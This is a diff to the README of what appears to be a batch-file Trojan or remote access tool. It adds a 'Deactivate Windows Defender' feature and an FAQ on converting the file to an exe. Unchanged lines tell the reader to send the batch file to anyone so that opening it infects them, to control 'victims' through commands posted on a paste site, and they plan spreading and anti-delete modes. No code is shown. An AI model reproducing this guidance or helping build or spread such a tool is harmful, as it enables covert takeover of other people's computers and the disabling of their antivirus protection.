@@ -17,6 +17,7 @@
 ####	- Standby Mode
 #### 	- Vanish Mode Automatic [Comming Soon]
 #### 	- Immortal Mode (Spreading and Infecting the PC,Antidelete...)[Comming Soon]
+####  - Deactivate Windows Defender
 
 ### Remote Control 
 #### 	- Send Commands to Victim
@@ -49,3 +50,9 @@
 ####  7. Send this batch File to anyone, the person only have to open the File and they get Infected.
 ####  8. Now Setup is done and you can Control youre Victims via editing the Paste site and send out Commands!
 ####  0. Need Help? Contact Me : Executioner#5068
+
+## FAQ
+
+### Some Basic stuff you might want to change and think of.
+####  - Batch to Exe possible? Yep feel free to convert it, it wont corrupt the Trojan. (Keep in mind Antivirus will detect the File.)
+####  - Can I add my own function's to the Programm? Yes but you need to know what you're doing the Programm is hold simple to easily understand it. (Maybe it will be easier in the feature in any Update a will add a create new function method for beginners-noobs)
